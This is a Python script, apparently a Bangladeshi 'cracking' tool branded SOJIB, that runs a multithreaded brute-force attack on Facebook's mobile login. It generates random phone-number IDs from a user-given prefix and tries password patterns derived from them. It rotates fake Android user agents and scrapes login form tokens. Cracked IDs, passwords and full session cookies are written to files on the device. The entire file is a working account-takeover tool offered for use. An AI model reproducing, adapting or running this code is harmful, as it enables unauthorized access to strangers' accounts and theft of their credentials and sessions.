#!/usr/bin/python
#Original written By Ethan Edward SOJIB. 
#Created Date 22.8.2022

import os,sys





try:
    import concurrent.futures
except ImportError:
    print('\n  installing futures ...\n')
    os.system('pip install futures')

try:
    import mechanize
except ModuleNotFoundError:
    os.system('pip install mechanize > /dev/null')
    import mechanize

import re,platform, sys, random,base64,uuid,zlib,re,uuid,shutil,time,sys,random,time,re,platform,string,time,re,random,sys,string,uuid
from concurrent.futures import ThreadPoolExecutor as SOJIBed
from string import * 
from time import sleep as slp
import platform
import requests
from concurrent.futures import ThreadPoolExecutor
fast_work = ThreadPoolExecutor(max_workers=15).submit

import urllib3

model2 = requests.get('https://gist.githubusercontent.com/Nox-Naved/f0fe39c5e9ff2b70bcb39e48a3e77301/raw/413a4f26f81da4f40d51349a87facc2894bc0531/600+').text.splitlines()
darkweb = urllib3.PoolManager()
totaldmp = 0
count = 0
loop = 0
oks = []
cps = []
id = []
ps = []
sid = []
total=[]
methods = []
srange = 0
saved = []
totaldmp = 0
filter = []
xagent=[]
fk_xd = []



S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;39m'
F = '\x1b[38;5;48m'
Z = '\033[1;33m'


P = '\x1b[1;97m' 
M = '\033[1;31m' 
H = '\033[1;32m' 
K = '\x1b[1;97m' 
B = '\x1b[1;97m' 
U = '\x1b[1;95m' 
O = '\x1b[1;97m' 
N = '\x1b[0m'    

def ua():
    u = f"Mozilla/5.0 (Linux; Android "+str(random.randint(4,14))+"; "+str(random.choice(model2))+"  Build/SP1A"+str(random.randrange(1111,9999))+"."+str(random.randrange(0,99))+"; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+str(random.randrange(9,99))+".0."+str(random.randrange(1111,9999))+"."+str(random.randrange(9,99))+""
    return u
    

logo =                                          """

\t  .d88888b   88888888b 
\t  88.    "'  88        
\t  `Y88888b. a88aaaa    
\t        `8b  88        
\t  d8'   .8P  88        
\t   Y88888P   dP        
\033[1;30m●\x1b[38;5;7m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;30m●\x1b[38;5;7m
[\033[1;30m÷\x1b[38;5;7m] GITHUB \033[1;30m=\x1b[38;5;7m SOJIB-XD
[\033[1;30m÷\x1b[38;5;7m] FACEBOOK \033[1;30m=\x1b[38;5;7m SOJIB
\033[1;30m●\x1b[38;5;7m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;30m●\x1b[38;5;7m"""
import re
sys.stdout.write('\x1b]2; SOJIB - PRIVATE\x07')
import re

 


def clear():
    os.system("clear")
    print(logo)
    


def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        print('\n')
        print('\033[1;30m●\x1b[38;5;7m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;30m●\x1b[38;5;7m')
        print('\x1b[38;5;49m[\x1b[38;5;47m>\x1b[38;5;46m] TOTAL OK: %s' % str(len(oks)))
        print('\033[1;30m●\x1b[38;5;7m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;30m●\x1b[38;5;7m')
        exit()
        raise ValueError("Fuck Your Bypass System")


def pwmanager(num,type):
        if 'first' in type:
            try:
                code = type.split('t')[1]
                password = num[:int(code)]
            except:
                password = num
        elif 'last' in type:
            try:
                code = type.split('t')[1]
                password = num[-int(code):]
            except:
                password = num
        else:
            password = type
        return password


def random_india():
    user=[]
    clear()
    print('\x1b[38;5;7m[\x1b[1;30m=\x1b[38;5;7m] example; 017')
    print('\033[1;30m●\x1b[38;5;7m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;30m●\x1b[38;5;7m')
    code = input('\x1b[38;5;7m[\x1b[1;30m=\x1b[38;5;7m] code: ')
    os.system('clear')
    print(logo)
    limit = int(input('\x1b[38;5;7m[\x1b[1;30m=\x1b[38;5;7m] Example: 1000, 2000, 5000, 10000\n\033[1;30m●\x1b[38;5;7m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;30m●\x1b[38;5;7m\n\x1b[38;5;7m[\x1b[1;30m=\x1b[38;5;7m] Enter number limit: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    os.system('clear')
    print(logo)
    rng = input('\x1b[38;5;7m[\x1b[1;30m=\x1b[38;5;7m] Password limit ? :')
    os.system('clear')
    print(logo)
    print('\x1b[38;5;7m[\x1b[1;30m=\x1b[38;5;7m] Example:last8,57273200 ')
    print('\033[1;30m●\x1b[38;5;7m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;30m●\x1b[38;5;7m')
    pslist = []
    for p in range(int(rng)):
            ap = input(f'\x1b[38;5;7m[\x1b[1;30m{p+1}\x1b[38;5;7m] Password : ')
            pslist.append(ap)
    with SOJIBed(max_workers=30) as SOJIBworld:
        clear()
        print('\033[1;30m●\x1b[38;5;7m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;30m●\x1b[38;5;7m')
        sl = str(len(user))
        print(f'\x1b[38;5;7m[\x1b[1;30m=\x1b[38;5;7m] Total ids :\033[1;37m '+sl)
        print("\033[1;30m●\x1b[38;5;7m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;30m●\x1b[38;5;7m")
        for sbz in user:
            sid = code+sbz
            SOJIBworld.submit(rcrack,sid,pslist)
    print('\n')
    print('\033[1;30m●\x1b[38;5;7m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;30m●\x1b[38;5;7m')
    print('\033[1;37m TOTAL \x1b[97;1mOK: %s' % str(len(oks)))
    print('\033[1;37m TOTAL \x1b[97;1mCP: %s' % str(len(cps)))
    print('\033[1;30m●\x1b[38;5;7m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;30m●\x1b[38;5;7m')
    exit()

   


def status(uid):
    url = 'https://graph.facebook.com/'+uid+'/picture?type=normal'
    req = str(requests.get(url).text)
    if 'Photoshop' in req:
        return 'Active'
    else:
        return 'Locked'


def rcrack(sid,pwx):
        global loop
        global oks
        global cps
        try:
            for pws in pwx:
                sys.stdout.write(f"\r[SOJIB-R] {loop}|•|\x1b[38;5;40m{len(oks)}\x1b[38;5;7m")
                sys.stdout.flush()
                ps = pwmanager(sid,pws)
                with requests.Session() as session:
                    link = session.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=467906450393051&kid_directed_site=0&app_id=467906450393051&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv18.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Faccounts.krafton.com%252Fauth%252Ffacebook%252Fcallback%26scope%3Demail%26state%3D0tM5UMbmtPUS0p7IBsLtsEOE%26client_id%3D467906450393051%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dbae029e0-a958-43a5-9179-0c98112de76d%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccounts.krafton.com%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D0tM5UMbmtPUS0p7IBsLtsEOE%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr').text
                data={
                'm_ts': re.search('name="m_ts" value="(.*?)"', str(link)).group(1),
                'li': re.search('name="li" value="(.*?)"', str(link)).group(1),
                'try_number': '0',
                'unrecognized_tries': '0',
                'email': sid,
                'prefill_contact_point': '',
                'prefill_source': '',
                'prefill_type': '',
                'first_prefill_source': '',
                'first_prefill_type': '',
                'had_cp_prefilled': 'true',
                'had_password_prefilled': 'true',
                'is_smart_lock': 'false',
                'bi_xrwh': '0',
                'pass': ps,
                'jazoest': re.search('name="jazoest" value="(.*?)"', str(link)).group(1),
                'lsd': re.search('name="lsd" value="(.*?)"', str(link)).group(1),
                '__dyn': '1KQdAG1mws8-t0BBBzEnwSwgE98nwgU2owpUuwcC4o1nEhwem0iy1gCwjE1xoswaq1Jw20Ehw73wwyo36wdq0ny1Aw4vw8W0iW220jG3qaw4kwbS1Lw9C0hO3q0ue',
                '__req': '4',
                '__a': 'AYnhsPkZVwArH-eOQ4xp7S0Bu3oR8-W3Eiab0ptEJ8SLT4eK9hL6AuQsG_tkySgoW0iMtzjCUCnp9bwQLT2joJ3n0Zic7ykb7EWU4bFObSuHQQ',
                '__user': '0',}
                headers = {
            'User-Agent': ua(),
            'authority': 'm.facebook.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'dpr': '3.5',
            'origin': 'https://m.facebook.com',
            'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=467906450393051&kid_directed_site=0&app_id=467906450393051&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv18.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Faccounts.krafton.com%252Fauth%252Ffacebook%252Fcallback%26scope%3Demail%26state%3D0tM5UMbmtPUS0p7IBsLtsEOE%26client_id%3D467906450393051%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dbae029e0-a958-43a5-9179-0c98112de76d%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccounts.krafton.com%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D0tM5UMbmtPUS0p7IBsLtsEOE%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"Venus x1"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"14.0.0"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'viewport-width': '393',
            'x-asbd-id': '129477',
            'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(link)).group(1),
            'x-requested-with': 'XMLHttpRequest',
            'x-response-format': 'JSONStream'}
                session.post('https://m.facebook.com/login/device-based/login/async/?api_key=467906450393051&auth_token=e25e9f605167db973170ede84747f644&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv18.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Faccounts.krafton.com%252Fauth%252Ffacebook%252Fcallback%26scope%3Demail%26state%3D0tM5UMbmtPUS0p7IBsLtsEOE%26client_id%3D467906450393051%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dbae029e0-a958-43a5-9179-0c98112de76d%26tp%3Dunspecified%26cbt%3D1710839116442&refsrc=deprecated&app_id=467906450393051&cancel=https%3A%2F%2Faccounts.krafton.com%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D0tM5UMbmtPUS0p7IBsLtsEOE%23_%3D_&lwv=100',headers=headers, data=data).text
                log_cookies=session.cookies.get_dict().keys()
                if 'c_user' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    sid=re.findall('c_user=(.*);xs', coki)[0]
                    try:
                        req = status(sid)
                        if'Active' in req:
                            print(f"\r{R}[SOJIB-OK] {sid} | {ps}")
                            oks.append(sid)
                            open('/sdcard/SOJIB-R-OK.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SOJIB-R-OK-W-COOKIE.txt','a').write(sid+'|'+ps+'|'+coki+'\n')
                            break
                    except:
                        break
                elif 'checkpoint' in log_cookies:
                    open('/sdcard/SOJIB-CP.txt','a').write(sid+'|'+ps+'\n')
                    cps.append(sid)
                else:
                    continue
            loop+=1
        except Exception as e:
            pass



random_india()
